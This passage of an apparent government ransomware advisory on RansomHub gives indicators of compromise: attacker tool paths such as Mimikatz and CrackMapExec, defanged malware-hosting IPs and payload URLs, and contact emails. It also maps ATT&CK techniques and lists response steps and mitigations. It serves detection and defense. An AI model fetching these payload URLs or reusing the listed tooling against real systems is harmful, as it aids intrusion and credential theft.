</tr>
<tr>
<td>CrackMapExec</td>
<td>Pentest Toolset</td>
</tr>
<tr>
<td>Kerberoast</td>
<td>Kerberos Brute force and Exploitation Tool</td>
</tr>
<tr>
<td>AngryIPScanner</td>
<td>Network Scanner</td>
</tr>
</tbody>
</table>
<h2><strong>Indicators of Compromise</strong></h2>
<p><strong>Disclaimer:</strong> Several of these IP addresses were first observed as early as 2020, although most date from 2022 or 2023 and have been historically linked to QakBot. The authoring organizations recommend organizations investigate or vet these IP addresses prior to taking action (such as blocking).</p>
<p>See <strong>Table 2–Table 5</strong> for IOCs obtained from FBI investigations.</p>
<div>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 2: Directory Structure TTPs</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\">Filename</th>
<th role=\"columnheader\"><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>C:\\Users\\%USERNAME%\\AppData\\Local\\Programs\\Python\\Python311\\Scripts\\crackmapexec.exe</td>
<td>CrackMapExec</td>
</tr>
<tr>
<td>C:\\Users\\%USERNAME%\\AppData\\Local\\Programs\\Python\\Python311\\Scripts\\kerbrute.exe</td>
<td>Kerberoasting</td>
</tr>
<tr>
<td>C:\\Users\\%USERNAME%\\Downloads\\Anydesk.exe</td>
<td>Anydesk C2</td>
</tr>
<tr>
<td>C:\\Users\\%USERNAME%\\Desktop\\IamBatMan.exe</td>
<td>Ransomware</td>
</tr>
<tr>
<td>C:\\Users\\backupexec\\Desktop\\stealer_cli_v2.exe</td>
<td>Info Stealer</td>
</tr>
<tr>
<td>C:\\Users\\%USERNAME%\\Downloads\\nmap-7.94-setup.exe</td>
<td>Nmap</td>
</tr>
<tr>
<td>C:\\Program Files (x86)\\Nmap\\nmap.exe</td>
<td>Nmap</td>
</tr>
<tr>
<td>C:\\Users\\%USERNAME%\\Downloads\\mimikatz_trunk\\x64\\mimikatz.exe</td>
<td><a>Mimikatz</a></td>
</tr>
<tr>
<td>C:\\Users\\backupexec\\Downloads\\x64\\mimikatz.exe</td>
<td>Mimikatz</td>
</tr>
</tbody>
</table>
<p><strong>Disclaimer</strong>: The authoring organizations recommend network defenders investigate or vet IP addresses prior to taking action, such as blocking. Many cyber actors are known to change IP addresses, sometimes daily, and some IP addresses may host valid domains.</p>
<div>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 3: Known IPs Related to Malicious Activity (2023-2024)</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\">IP Address</th>
</tr>
</thead>
<tbody>
<tr>
<td><a>8.211.2[.]97</a></td>
</tr>
<tr>
<td>45.95.67[.]41</td>
</tr>
<tr>
<td>45.134.140[.]69</td>
</tr>
<tr>
<td>45.135.232[.]2</td>
</tr>
<tr>
<td>89.23.96[.]203</td>
</tr>
<tr>
<td>188.34.188[.]7</td>
</tr>
<tr>
<td>193.106.175[.]107</td>
</tr>
<tr>
<td>193.124.125[.]78</td>
</tr>
<tr>
<td>193.233.254[.]21</td>
</tr>
</tbody>
</table>
<div>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 4: Known URLs Related to Malicious Activity (2023-2024)</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\">Web Requests</th>
</tr>
</thead>
<tbody>
<tr>
<td><a>http[:]//188.34.188[.]7/555</a></td>
</tr>
<tr>
<td>http[:]//188.34.188[.]7/555/</td>
</tr>
<tr>
<td>http[:]//188.34.188[.]7/555/amba16.ico</td>
</tr>
<tr>
<td>http[:]//188.34.188[.]7/555/bcrypt.dll</td>
</tr>
<tr>
<td>http[:]//188.34.188[.]7/555/CRYPTSP.dll</td>
</tr>
<tr>
<td>http[:]//188.34.188[.]7/555/en</td>
</tr>
<tr>
<td>http[:]//188.34.188[.]7/555/en-US</td>
</tr>
<tr>
<td>http[:]//188.34.188[.]7/555/NEWOFFICIALPROGRAMCAUSEOFNEWUPDATE.exe</td>
</tr>
<tr>
<td>http[:]//188.34.188[.]7/555/NEWOFFICIALPROGRAMCAUSEOFNEWUPDATE.exe.Config</td>
</tr>
<tr>
<td>http[:]//188.34.188[.]7/555/NEWOFFICIALPROGRAMCAUSEOFNEWUPDATE.INI</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/1.exe</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/1.exe.Config</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/10.exe</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/12.exe</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/12.exe.Config</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/2.exe</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/2.exe.Config</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/2wrRR6sW6XJtsXyPzuhWhDG7qwN4es.exe</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/2wrRR6sW6XJtsXyPzuhWhDG7qwN4es.exe.Config</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/3.exe</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/3.exe.Config</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/4.exe</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/4.exe.Config</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/5.exe</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/5.exe.Config</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/6.exe</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/7.exe</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/8.exe</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/9.exe</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/92.exe</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/AmbaPDF.ico</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/ambapdf.ico.DLL</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/bcrypt.dll</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/Cabinet.dll</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/CRYPTBASE.DLL</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/cryptnet.dll</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/CRYPTSP.dll</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/cv4TCGxUjvS.exe</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/DPAPI.DLL</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/en</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/en/d%E5%AD%97%E5%AD%97.resources.dll</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/en/d%E5%AD%97%E5%AD%97.resources.exe</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/en/d%E5%AD%97%E5%AD%97.resources/d%E5%AD%97%E5%AD%97.resources.dll</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/en/d%E5%AD%97%E5%AD%97.resources/d%E5%AD%97%E5%AD%97.resources.exe</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/en-US</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/en-US/d%E5%AD%97%E5%AD%97.resources.dll</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/en-US/d%E5%AD%97%E5%AD%97.resources.exe</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/en-US/d%E5%AD%97%E5%AD%97.resources/d%E5%AD%97%E5%AD%97.resources.dll</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/en-US/d%E5%AD%97%E5%AD%97.resources/d%E5%AD%97%E5%AD%97.resources.exe</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/iertutil.dll</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/information.exe</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/information.exe.Config</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/information.INI</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/IPHLPAPI.DLL</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/mshtml.dll</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/msi.dll</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/SspiCli.dll</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/TmsLA6kdcU8jxKzpMvbUVweTeF5YcR.exe</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/TmsLA6kdcU8jxKzpMvbUVweTeF5YcR.exe.Config</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/2wrRR6sW6XJtsXyPzuhWhDG7qwN4es.exe</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/xwenxub285p83ecrzvft.exe</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/cv4TCGxUjvS.exe</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/urlmon.dll</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/USERENV.dll</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/webio.dll</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/winhttp.dll</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/WININET.dll</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/WINMM.dll</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/WINMMBASE.dll</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/winnlsres.dll</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/xwenxub285p83ecrzvft.exe</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/xwenxub285p83ecrzvft.exe.Config</td>
</tr>
<tr>
<td>http[:]//temp.sh/KnCqD/superloop.exe</td>
</tr>
<tr>
<td>https[:]//grabify.link/Y33YXP</td>
</tr>
<tr>
<td>https[:]//<a>i.ibb.co</a>/2KBydfw/112882618.png</td>
</tr>
<tr>
<td>https[:]//i.ibb.co/4g6jH2J/2773036704.png</td>
</tr>
<tr>
<td>https[:]//i.ibb.co/b1bZBpg/2615174623.png</td>
</tr>
<tr>
<td>https[:]//i.ibb.co/Fxhyq6t/2077411869.png</td>
</tr>
<tr>
<td>https[:]//i.ibb.co/HK0jV1G/534475006.png</td>
</tr>
<tr>
<td>https[:]//i.ibb.co/nbMNnW4/2501108160.png</td>
</tr>
<tr>
<td>https[:]//i.ibb.co/p1RCtpy/2681232755.png</td>
</tr>
<tr>
<td>https[:]//i.ibb.co/SxQLwYm/1038436121.png</td>
</tr>
<tr>
<td>https[:]//i.ibb.co/v1bn9ZK/369210627.png</td>
</tr>
<tr>
<td>https[:]//i.ibb.co/V3Kj1c2/1154761258.png</td>
</tr>
<tr>
<td>https[:]//i.ibb.co/X2FR8Kz/2113791011.png</td>
</tr>
<tr>
<td>https[:]//i.ibb.com:443/V3Kj1c2/1154761258.png</td>
</tr>
<tr>
<td>https[:]//12301230[.]co/npm/module.tripadvisor/module.tripadvisor.css</td>
</tr>
<tr>
<td>https[:]//12301230[.]co/npm/module.external/jquery.min.js</td>
</tr>
<tr>
<td>https[:]//12301230[.]co/npm/module.external/moment.min.js</td>
</tr>
<tr>
<td>https[:]//12301230[.]co/npm/module.external/client.min.js</td>
</tr>
<tr>
<td>https[:]//<a>12301230[.]co</a>/npm/module.tripadvisor/module.tripadvisor.js</td>
</tr>
<tr>
<td>https[:]//samuelelena[.]co/npm/module.tripadvisor/module.tripadvisor.js</td>
</tr>
<tr>
<td>https[:]//samuelelena[.]co/npm/module.external/jquery.min.js</td>
</tr>
<tr>
<td>https[:]//samuelelena[.]co/npm/module.external/moment.min.js</td>
</tr>
<tr>
<td>https[:]//samuelelena[.]co/npm/module.external/client.min.js</td>
</tr>
<tr>
<td>https[:]//samuelelena[.]co/</td>
</tr>
<tr>
<td>http[:]//samuelelena[.]co/</td>
</tr>
<tr>
<td>https[:]//samuelelena[.]co/npm</td>
</tr>
<tr>
<td>https[:]//samuelelena[.]co/npm/module.tripadvisor/module.tripadvisor.js</td>
</tr>
<tr>
<td>http[:]//samuelelena[.]co/npm/</td>
</tr>
<tr>
<td>http[:]//samuelelena[.]co/npm/module.tripadvisor/module.tripadvisor.js</td>
</tr>
<tr>
<td>http[:]//samuelelena[.]co/npm/module.external/client.min.js</td>
</tr>
<tr>
<td>https[:]//samuelelena[.]co/npm/module.tripadvisor/module.tripadvisor.</td>
</tr>
<tr>
<td>https[:]//samuelelena[.]co/npm/module.external/jquery.min.js</td>
</tr>
<tr>
<td>https[:]//samuelelena[.]co/npm/module.external</td>
</tr>
<tr>
<td><a>https[:]//samuelelena[.]co</a>/np</td>
</tr>
<tr>
<td>https[:]/samuelelena[.]co/npm/module.tripadvisor/module.tripadvisor.js</td>
</tr>
<tr>
<td>https[:]//samuelelena[.]co/npm/module[.]tripadvisor/module[.]tripadvisor[.]js</td>
</tr>
<tr>
<td>https[:]//samuelelena[.]co/npm/module[.]external/client.min.js</td>
</tr>
<tr>
<td>https[:]//samuelelena[.]co/npm/module.external/jquery.min.js&amp;nbsp;</td>
</tr>
<tr>
<td>http[:]//samuelelena[.]co:443/</td>
</tr>
<tr>
<td>http[:]//samuelelena[.]co/npm/module.external/jquery.min.js</td>
</tr>
<tr>
<td><a>https[:]//40031[.]co</a>/npm/module.tripadvisor/module.tripadvisor.css</td>
</tr>
<tr>
<td>https[:]//40031[.]co/npm/module.external/jquery.min.js</td>
</tr>
<tr>
<td>https[:]//40031[.]co/npm/module.external/moment.min.js</td>
</tr>
<tr>
<td>https[:]//40031[.]co/npm/module.external/client.min.js</td>
</tr>
<tr>
<td>https[:]//40031[.]co/npm/module.tripadvisor/module.tripadvisor.js</td>
</tr>
</tbody>
</table>
<div>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 5: Emails Related to RansomHub (2023-2024)</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\">Email Addresses</th>
</tr>
</thead>
<tbody>
<tr>
<td>brahma2023[@]onionmail.org</td>
</tr>
<tr>
<td>&lt;victim_organization_name&gt;[@]protonmail.com</td>
</tr>
</tbody>
</table>
<h2><strong>MITRE ATT&amp;CK Tactics and Techniques</strong></h2>
<p>See&nbsp;<strong>Table 6–Table 17&nbsp;</strong>for all referenced threat actor tactics and techniques in this advisory. For assistance with mapping malicious cyber activity to the MITRE ATT&amp;CK framework, see CISA and MITRE ATT&amp;CK’s <a href=\"https://www.cisa.gov/news-events/news/best-practices-mitre-attckr-mapping\" title=\"Best Practices for MITRE ATT&amp;CK Mapping\">Best Practices for MITRE ATT&amp;CK Mapping</a> and CISA’s <a href=\"https://github.com/cisagov/Decider/\" title=\"cisagov / decider\">Decider Tool</a>.</p>
<div>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 6: Resource Development</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\">Technique Title</th>
<th role=\"columnheader\">ID</th>
<th role=\"columnheader\">Use</th>
</tr>
</thead>
<tbody>
<tr>
<td>Obtain Capabilities: Exploits</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1588/005/\" title=\"Obtain Capabilities: Exploits\">T1588.005</a></td>
<td>RansomHub affiliates may buy, steal, or download exploits that can be used during targeting.</td>
</tr>
</tbody>
</table>
<div>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 7: Initial Access</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\">Technique Title</th>
<th role=\"columnheader\">ID</th>
<th role=\"columnheader\">Use</th>
</tr>
</thead>
<tbody>
<tr>
<td>Phishing</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1566/\" title=\"Phishing\">T1566</a></td>
<td>RansomHub affiliates used mass phishing and spear-phishing emails to obtain initial access.</td>
</tr>
<tr>
<td>Exploit Public-Facing Application</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1190/\" title=\"Exploit Public-Facing Application\">T1190</a></td>
<td>RansomHub affiliates may exploit known vulnerabilities to obtain initial access.</td>
</tr>
</tbody>
</table>
<div>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 8: Execution</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\">Technique Title</th>
<th role=\"columnheader\">ID</th>
<th role=\"columnheader\">Use</th>
</tr>
</thead>
<tbody>
<tr>
<td>Command and Scripting Interpreter</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1059/001/\" title=\"Command and Scripting Interpreter\">T1059.001</a></td>
<td>RansomHub affiliates used PowerShell and Scripts to quickly run and automate intrusion.</td>
</tr>
<tr>
<td>Windows Management Instrumentation</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1047/\" title=\"Windows Management Instrumentation\">T1047</a></td>
<td>RansomHub affiliates may abuse Windows Management Instrumentation to execute malicious commands and payloads.</td>
</tr>
</tbody>
</table>
<div>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 9: Persistence</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\">Technique Title&nbsp;</th>
<th role=\"columnheader\">ID</th>
<th role=\"columnheader\">Use</th>
</tr>
</thead>
<tbody>
<tr>
<td>Command and Scripting Interpreter</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1059/001/\" title=\"Command and Scripting Interpreter\">T1059.001</a></td>
<td>RansomHub affiliates used PowerShell and Scripts to quickly run and automate intrusion.</td>
</tr>
<tr>
<td>Create Account</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1136/\" title=\"Create Account\">T1136</a></td>
<td>RansomHub affiliates may create an account to maintain access to victim systems.</td>
</tr>
</tbody>
</table>
<div>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 10: Privilege Escalation</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\">Technique Title</th>
<th role=\"columnheader\">ID</th>
<th role=\"columnheader\">Use</th>
</tr>
</thead>
<tbody>
<tr>
<td>Account Manipulation</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1098/\" title=\"Account Manipulation\">T1098</a></td>
<td>RansomHub affiliates may manipulate accounts to maintain and/or elevate access to victim systems.</td>
</tr>
<tr>
<td>Remote Services: Remote Desktop Protocol</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1021/001/\" title=\"Remote Services: Remote Desktop Protocol\">T1021.001</a></td>
<td>RansomHub affiliates may log onto systems using the Remote Desk Protocol, then perform actions as the logged-on user.</td>
</tr>
</tbody>
</table>
<div>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 11: Defense Evasion</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\">Technique Title</th>
<th role=\"columnheader\">ID</th>
<th role=\"columnheader\">Use</th>
</tr>
</thead>
<tbody>
<tr>
<td>Masquerading</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1036/\" title=\"Masquerading\">T1036</a></td>
<td>RansomHub affiliates may hide binaries by renaming executable names.</td>
</tr>
<tr>
<td>Indicator Removal on Host</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1070/\" title=\"Indicator Removal on Host\">T1070</a></td>
<td>RansomHub affiliates may remove logs to inhibit cybersecurity response.</td>
</tr>
<tr>
<td>Impair Defenses: Disable or Modify Tools</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1562/001/\" title=\"Impair Defenses: Disable or Modify Tools\">T1562.001</a></td>
<td>RansomHub affiliates may disable endpoint detection and response (EDR) tooling to avoid detection.</td>
</tr>
</tbody>
</table>
<div>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 12: Credential Access</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\">Technique Title</th>
<th role=\"columnheader\">ID</th>
<th role=\"columnheader\">Use</th>
</tr>
</thead>
<tbody>
<tr>
<td>OS Credential Dumping</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1003/\" title=\"OS Credential Dumping\">T1003</a></td>
<td>RansomHub affiliates used Mimikatz on Windows systems to gather credentials.</td>
</tr>
<tr>
<td>Brute Force: Password Spraying</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1110/003/\" title=\"Brute Force: Password Spraying\">T1110.003</a></td>
<td>RansomHub affiliates may use password spraying to obtain initial access.</td>
</tr>
</tbody>
</table>
<div>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 13: Discovery</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\">Technique Title</th>
<th role=\"columnheader\">ID</th>
<th role=\"columnheader\">Use</th>
</tr>
</thead>
<tbody>
<tr>
<td>Remote System Discovery</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1018/\" title=\"Remote System Discovery\">T1018</a></td>
<td>RansomHub affiliates may attempt to get a listing of other systems by IP address, hostname, or other logical identifier on a network that may be used for Lateral Movement from the current system.&nbsp;</td>
</tr>
<tr>
<td>Network Service Discovery</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1046/\" title=\"Network Service Discovery\">T1046</a></td>
<td>RansomHub affiliates may attempt to get a listing of services running on remote hosts and local network infrastructure devices,</td>
</tr>
</tbody>
</table>
<div>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 14: Lateral Movement</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\">Technique Title</th>
<th role=\"columnheader\">ID</th>
<th role=\"columnheader\">Use</th>
</tr>
</thead>
<tbody>
<tr>
<td>Exploitation of Remote Services</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1210/\" title=\"Exploitation of Remote Services\">T1210</a></td>
<td>RansomHub affiliates may exploit remote service to gain unauthorized access to internal systems once inside of a network.&nbsp;</td>
</tr>
</tbody>
</table>
<div>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 15: Command and Control</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\">Technique Title</th>
<th role=\"columnheader\">ID</th>
<th role=\"columnheader\">Use</th>
</tr>
</thead>
<tbody>
<tr>
<td>Remote Access Software</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1219/\" title=\"Remote Access Software\">T1219</a></td>
<td>RansomHub affiliates may use Anydesk, a legitimate desktop support and remote access software to establish an interactive command and control channel to target systems within networks.</td>
</tr>
</tbody>
</table>
<div>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 16: Exfiltration</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\">Technique Title</th>
<th role=\"columnheader\">ID</th>
<th role=\"columnheader\">Use</th>
</tr>
</thead>
<tbody>
<tr>
<td>Exfiltration Over Alternative Protocol: Exfiltration Over Asymmetric Encrypted Non-C2 Protocol</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1048/002/\" title=\"Exfiltration Over Alternative Protocol: Exfiltration Over Asymmetric Encrypted Non-C2 Protocol\">T1048.002</a></td>
<td>RansomHub affiliates may steal data by exfiltrating it over an asymmetrically encrypted network protocol other than that of the existing command and control channel.</td>
</tr>
<tr>
<td>Transfer Data to Cloud Account</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1537/\" title=\"Transfer Data to Cloud Account\">T1537</a></td>
<td>RansomHub affiliates may exfiltrate data by transferring the data, including through sharing/syncing and creating backups of cloud environments, to another cloud account they control on the same service.</td>
</tr>
<tr>
<td>Exfiltration Over Alternative Protocol: Exfiltration Over Asymmetric Unencrypted Non-C2 Protocol</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1048/003/\" title=\"Exfiltration Over Alternative Protocol: Exfiltration Over Asymmetric Unencrypted Non-C2 Protocol\">T1048.003</a></td>
<td>RansomHub affiliates may steal data by exfiltrating it over an un-encrypted network protocol other than that of the existing command and control channel.</td>
</tr>
</tbody>
</table>
<div>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 17: Impact</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\">Technique Title</th>
<th role=\"columnheader\">ID</th>
<th role=\"columnheader\">Use</th>
</tr>
</thead>
<tbody>
<tr>
<td>Data Encrypted for Impact</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1486/\" title=\"Data Encrypted for Impact\">T1486</a></td>
<td>RansomHub affiliates used encryption for ransomware operations.</td>
</tr>
<tr>
<td>Inhibit System Recovery</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1490/\" title=\"Inhibit System Recovery\">T1490</a></td>
<td>RansomHub ransomware deleted volume shadow copies and affiliates removed backups for ransomware operations.</td>
</tr>
</tbody>
</table>
<h2><strong>Incident Response</strong></h2>
<p>If compromise is detected, organizations should:</p>
<ol>
<li>Quarantine or take potentially affected hosts offline.</li>
<li>Reimage compromised hosts.</li>
<li>Provision new account credentials.</li>
<li>Collect and review artifacts such as running processes/services, unusual authentications, and recent network connections.</li>
<li>Report the compromise to CISA via CISA’s 24/7 Operations Center (<a href=\"mailto:report@cisa.gov\" title=\"Report to CISA\">report@cisa.gov</a> or 888-282-0870). State, local, tribal, or territorial government entities can also report to the Multi-State Information Sharing and Analysis Center (MS-ISAC) (<a href=\"mailto:SOC@cisecurity.org\" title=\"Report to MS-ISAC\">SOC@cisecurity.org</a> or 866-787-4722).</li>
</ol>
<h2><strong>Mitigations</strong></h2>
<h3>Network Defenders</h3>
<p>The authoring organizations recommend organizations implement the mitigations below to improve cybersecurity posture based on RansomHub’s activity. These mitigations align with the Cross-Sector Cybersecurity Performance Goals (CPGs) developed by CISA and the National Institute of Standards and Technology (NIST). The CPGs provide a minimum set of practices and protections that CISA and NIST recommend all organizations implement. CISA and NIST based the CPGs on existing cybersecurity frameworks and guidance to protect against the most common and impactful threats, tactics, techniques, and procedures. Visit CISA’s <a href=\"https://www.cisa.gov/cross-sector-cybersecurity-performance-goals\" title=\"Cross-Sector Cybersecurity Performance Goals\">Cross-Sector Cybersecurity Performance Goals</a> for more information on the CPGs, including additional recommended baseline protections.</p>
<ul>
<li><strong>Implement a recovery plan to maintain and retain multiple copies of sensitive or proprietary data and servers in a physically separate, segmented, and secure location (i.e., hard drive, storage device, the cloud).</strong></li>
<li><strong>Require all accounts with password logins</strong> <strong>(e.g., service accounts, admin accounts, and domain admin accounts) to comply with&nbsp;</strong><a href=\"https://pages.nist.gov/800-63-3/\" title=\"Digital Identity Guidelines\">National Institute for Standards and Technology (NIST) standards</a><strong> for developing and managing password policies.</strong>
<ul>
<li>Use longer passwords consisting of at least 8 characters and no more than 64 characters in length;</li>
<li>Store passwords in hashed format using industry-recognized password managers;</li>
<li>Add password user “salts” to shared login credentials;</li>
<li>Avoid reusing passwords;</li>
<li>Implement multiple failed login attempt account lockouts;</li>
<li>Disable password “hints”; and</li>
<li>Refrain from requiring password changes more frequently than once per year.<br><strong>Note:</strong> NIST guidance suggests favoring longer passwords instead of requiring regular and frequent password resets. Frequent password resets are more likely to result in users developing password “patterns” cyber criminals can easily decipher.</li>
<li>Require administrator credentials to install software.</li>
</ul>
</li>
<li><strong>Keep all operating systems, software, and firmware up to date</strong> [<a href=\"https://www.cisa.gov/cross-sector-cybersecurity-performance-goals#MitigatingKnownVulnerabilities1E)\" title=\"Mitigating Known Vulnerabilities (1.E)\">CPG 1.E</a>]. Timely patching is one of the most efficient and cost-effective steps an organization can take to minimize its exposure to cybersecurity threats. Prioritize patching known exploited vulnerabilities in internet-facing systems.</li>
<li><strong>Require Phishing-Resistant multifactor authentication to administrator accounts</strong> [<a href=\"https://www.cisa.gov/cross-sector-cybersecurity-performance-goals#PhishingResistantMultifactorAuthenticationMFA2H\" title=\"Phishing-Resistant Multifactor Authentication (MFA) (2.H)\">CPG 2.H</a>] and require standard MFA for all services to the extent possible (particularly for webmail, virtual private networks, and accounts that access critical systems).</li>
